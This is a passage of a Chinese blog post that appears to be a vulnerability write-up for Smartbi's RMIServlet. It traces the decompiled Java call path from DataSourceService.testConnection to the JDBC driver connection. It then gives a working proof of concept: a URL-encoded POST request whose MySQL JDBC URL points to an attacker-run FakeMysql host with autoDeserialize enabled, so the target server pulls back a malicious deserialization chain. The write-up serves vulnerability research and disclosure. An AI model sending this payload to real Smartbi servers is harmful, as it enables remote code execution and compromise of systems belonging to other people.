根据类名获取对应的 ClientService 实例。</span><br>        <span class="hljs-type">ClientService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> RMIModule.getInstance().getService(className);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//结果字符串的构建器 buff 用于生成最终 JSON 格式的响应体</span><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buff</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>()).append(<span class="hljs-string">&#x27;&#123;&#x27;</span>);<br>            <span class="hljs-comment">//判断 service 是否存在，未找到就抛出异常</span><br>            <span class="hljs-keyword">if</span> (service == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">Locale</span> <span class="hljs-variable">locale</span> <span class="hljs-operator">=</span> CommonConfiguration.getInstance().getLocale();<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">notFoundClass</span> <span class="hljs-operator">=</span> StringUtil.replaceLanguage(<span class="hljs-string">&quot;$&#123;Notfoundclass&#125;&quot;</span>, locale);<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR)).setDetail(className + <span class="hljs-string">&quot; &quot;</span> + notFoundClass);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//记录调用时间</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime();<br>                <span class="hljs-comment">//执行 execute 方法，即反射调用</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br>                <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime() - startTime;<br>                <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>                    buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0&quot;</span>);<br>                &#125;              <br></code></pre></td></tr></table></figure><p>接着 <code>params</code> 调用下面的方法： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br></code></pre></td></tr></table></figure><p><code>execute</code>方法处理逻辑：将传入的 <code>JSON</code> 转为 <code>IDataSource</code> 对象,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientService</span> &#123;<br>    ...<br>    <span class="hljs-comment">//接收 JSON 数组和方法名</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(String var1, JSONArray var2)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//从 this.a 中取出方法名对应的 Method 对象</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (Method)<span class="hljs-built_in">this</span>.a.get(var1);<br>            <span class="hljs-comment">//不存在抛出异常</span><br>            <span class="hljs-keyword">if</span> (var3 == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.METHOD_NAME_ERROR)).setDetail(var1);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//检查参数个数</span><br>                Class[] var4 = var3.getParameterTypes();<br>                <span class="hljs-keyword">if</span> (var4.length != var2.length()) &#123;<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.PARAM_COUNT_ERROR)).setDetail(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Method2&quot;</span>) + <span class="hljs-string">&quot;\&quot;&quot;</span> + var1 + <span class="hljs-string">&quot;\&quot;&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Thenumberofparametersis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var4.length + <span class="hljs-string">&quot; ,&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Butthenumberofargumentspassedinis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var2.length() + <span class="hljs-string">&quot; .&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">//创建Java类型参数数组</span><br>                    Object[] var5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[var2.length()];<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//进行类型转换，将 JSON -&gt; Java对象</span><br>                        <span class="hljs-comment">//获取每个参数的泛型类型（var6）</span><br>                        Type[] var6 = var3.getGenericParameterTypes();<br>                        <span class="hljs-comment">//遍历 JSON 参数，使用工具类 JSONUtil.jsonToObject(...) 转为目标类型</span><br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var7 &lt; var5.length; ++var7) &#123;<br>                            <span class="hljs-comment">//var2 是 JSONArray，也就是传入的 params</span><br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var2.get(var7);<br>                            <span class="hljs-comment">//目标方法 testConnection 的参数类型即 IDataSource</span><br>                            <span class="hljs-type">Class</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var4[var7];<br>                            <span class="hljs-comment">//泛型类型</span><br>                            <span class="hljs-type">Type</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var6[var7];<br>                            <span class="hljs-comment">//把 JSON 中的 JSONObject 转换成一个 Java 对象（var9 指定的类型），并作为方法参数传入</span><br>                            var5[var7] = JSONUtil.jsonToObject(var8, var9, var10);<br>                        &#125;<br>                    &#125; <br><br></code></pre></td></tr></table></figure><p>再进入 <code>DataSourceService.testConnection()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure><p>进入 <code>MetaDataServiceImpl.testConnection()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java">conn = ConnectionPool.getInstance().getConnection(ds);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetaDataServiceImpl</span> &#123;<br>    ...<br>    <span class="hljs-comment">//主要是将 IDataSource 转换为系统内部 DataSource 对象，然后尝试建立连接</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>    <span class="hljs-comment">//实例化 Smartbi 内部使用的 DataSource 类</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSource</span>();<br>    <span class="hljs-comment">//UUIDGenerator.generate() 应是一个工具类，生成随机 UUID</span><br>    ds.setId(UUIDGenerator.generate());<br>    <span class="hljs-comment">//把外部传入的 IDataSource 转成系统内部 DataSource格式</span><br>    ds.setName(dataSource.getName());<br>    ds.setAlias(dataSource.getAlias());<br>    ds.setDriver(dataSource.getDriver());<br>    ds.setDesc(dataSource.getDesc());<br>    ds.setDbCharset(dataSource.getDbCharset());<br>    ds.setUrl(dataSource.getUrl());<br>    ds.setUser(dataSource.getUser());<br>    ds.setDriverType(dataSource.getDriverType());<br>    ds.setMaxConnection(dataSource.getMaxConnection());<br>    ds.setValidationQuery(dataSource.getValidationQuery());<br>    ds.setPassword(dataSource.getPassword());<br>    ds.setTransactionIsolation(dataSource.getTransactionIsolation());<br>    ds.setValidationQueryMethod(dataSource.getValidationQueryMethod());<br>    ds.setAuthenticationType(dataSource.getAuthenticationType());<br>    <span class="hljs-comment">//如果 IDataSource 没有提供密码，并且提供了 ID，那么从数据库中查询旧数据源信息，取出其密码，用于本次连接</span><br>    <span class="hljs-keyword">if</span> (dataSource.getPassword() == <span class="hljs-literal">null</span> &amp;&amp; !StringUtil.isNullOrEmpty(dataSource.getId())) &#123;<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dbDs</span> <span class="hljs-operator">=</span> FreeQueryDAOFactory.getDataSourceDAO().load(dataSource.getId());<br>        ds.setPassword(dbDs.getPassword());<br>    &#125;<br><br>    <span class="hljs-comment">//声明 JDBC 连接对象 conn，后续用于建立连接</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//使用自定义的连接池 ConnectionPool 获取数据库连接</span><br>        conn = ConnectionPool.getInstance().getConnection(ds);<br>        <span class="hljs-keyword">if</span> (DBType.PRESTO == dataSource.getDriverType()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT 1&quot;</span>;<br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> JdbcUtil.prepareStatement(conn, sql);<br></code></pre></td></tr></table></figure><p>进入 <code>ConnectionPool.getConnection()</code>：进行数据池连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPool</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(IConnectionInfo ds)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//判断是否为系统知识库</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>.equals(ds.getId())) &#123;<br>        ds = <span class="hljs-built_in">this</span>.provider.getConnectionInfo(<span class="hljs-string">&quot;res&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//判断是否是 JNDI 数据</span><br>    <span class="hljs-keyword">if</span> (ds.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(ds.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>        <span class="hljs-keyword">return</span> dataSource.getConnection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ds.getValidationQueryMethod() == <span class="hljs-number">3</span>) &#123;<span class="hljs-comment">//加载 JDBC 驱动</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">driverClass</span> <span class="hljs-operator">=</span> ds.getDriver();<br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//通过自定义的 DynamicLoadLibManager 加载该类</span><br>            clazz = DynamicLoadLibManager.loadClass(driverClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var12) &#123;<br>            <span class="hljs-comment">//如果失败，使用备用 classLoader 加载</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            clazz = clzLoader == <span class="hljs-literal">null</span> ? Class.forName(driverClass) : clzLoader.loadClass(driverClass);<br>        &#125;<br>        <br><span class="hljs-comment">//创建 JDBC 驱动对象实例</span><br>        <span class="hljs-type">Driver</span> <span class="hljs-variable">jdbcDriver</span> <span class="hljs-operator">=</span> (Driver)clazz.newInstance();<br>        <span class="hljs-comment">//构建连接所需的属性（用户名、密码）</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;user&quot;</span>, ds.getUser());<br>        prop.put(<span class="hljs-string">&quot;password&quot;</span>, ds.getPassword());<br>        <span class="hljs-keyword">if</span> (ds.getDriverType() == DBType.KYLIN) &#123;<br>            prop.put(<span class="hljs-string">&quot;timezone&quot;</span>, <span class="hljs-string">&quot;GMT&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//通过反射调用 DriverManager.getConnection() 这个重载的私有方法</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, ClassLoader.class);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">//使用系统中的 classLoader</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clzLoader);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, Class.class);<br>                m.setAccessible(<span class="hljs-literal">true</span>);<br>                conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clazz);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>                conn = DriverManager.getConnection(ds.getUrl(), prop);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> (Connection)conn;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poolName</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (ds.getId().equals(<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>)) &#123;<br>            poolName = <span class="hljs-string">&quot;res&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            poolName = <span class="hljs-built_in">this</span>.getPoolNameFromDatasource(ds);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            driver.getConnectionPool(poolName);<br>            <span class="hljs-comment">//调用 driverConnect 获取连接池连接</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var11) &#123;<br>            <span class="hljs-built_in">this</span>.createPool(ds);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时服务器向远程的<code>FakeMysql</code>尝试连接，就会接收到<code>FakeMysql</code>返回的恶意序列化数据，</p><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h3><p>搭建 FakeMysql 服务器，用 Javachains 搭建，将 3308端口开启，监听的是<strong>本机IP地址的3308端口</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701134.png" alt="20250806161415587"></p><p>构造 K1链</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702650.png" alt="20250806162032486"></p><p>构造poc:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs perl">className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>:<span class="hljs-number">100</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>:<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>:<span class="hljs-string">&quot;SELECT 1 FROM DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:mysql://[本机IP]:3308/d4c5846?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>:<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>:-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>:<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br>-&gt;url编码<br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//[本机IP]<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br>POST /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1.1</span><br>Host: localhost:<span class="hljs-number">18080</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113.0</span><span class="hljs-number">.5672</span><span class="hljs-number">.127</span> Safari/<span class="hljs-number">537.36</span><br>Accept: *<span class="hljs-regexp">/*</span><br><span class="hljs-regexp">Origin: http:/</span><span class="hljs-regexp">/localhost</span><br><span class="hljs-regexp">Referer: http:/</span><span class="hljs-regexp">/localhost:18080/smar</span>tbi/vision/index.jsp<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;<span class="hljs-keyword">q</span>=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br>Cookie: JSESSIONID=0BBBD2EC4AE481FB607FC501FA04897E<br>Content-Type: application/<span class="hljs-keyword">x</span>-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br>Connection : keep-alive<br>Content-Length: <span class="hljs-number">580</span><br><br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//192.168.1.25<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702241.png" alt="20250806162931145"></p><h3 id="总结："><a 